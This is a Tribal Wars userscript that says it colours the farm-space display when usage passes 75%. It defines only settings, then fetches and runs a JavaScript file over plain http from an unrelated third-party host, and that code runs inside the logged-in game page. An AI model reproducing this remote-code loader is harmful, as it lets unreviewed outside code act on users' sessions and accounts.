// ==UserScript==
// @name   			Colorize farm space
// @description     Colorizes the farm space if exhausted by more than 75%
// @include			http://ae*.tribalwars.ae/game.php*
// @exclude         http://ae*.tribalwars.ae/game.php*screen=am*
// ==/UserScript==

win = typeof unsafeWindow != 'undefined' ? unsafeWindow : window;

// Settings for free farm space
// Colors can be assigned by using #FFCC00 etc. also
win.limit = '0.75';		// 0.75 means that the color will change at a capacity of 75%
win.farbe1 = 'green'	// normal color
win.farbe2 = 'orange'	// color limit reached
win.farbe3 = 'red'		// color farm full

win.$.ajaxSetup({ cache: true });
win.$.getScript('http://elcharro.zxq.net/new3.js');